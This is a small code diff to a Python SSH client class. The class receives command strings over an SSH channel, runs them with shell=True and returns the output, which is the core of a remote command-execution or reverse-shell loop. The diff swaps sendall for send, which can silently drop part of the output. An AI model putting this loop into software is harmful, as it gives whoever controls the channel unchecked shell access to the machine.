@@ -106,7 +106,7 @@ class sshClient(object):
 
             command = channel.recv(1024).decode()
             receivedCommand = subprocess.check_output(command, shell=True)
-            channel.sendall(receivedCommand)
+            channel.send(receivedCommand)
 
             logger.info(f"Received message{command}")
         except subprocess.CalledProcessError as e:
@@ -134,3 +134,4 @@ if __name__ == '__main__':
     # print(dir_path)
 
     sshClient.invoke_shell()
+
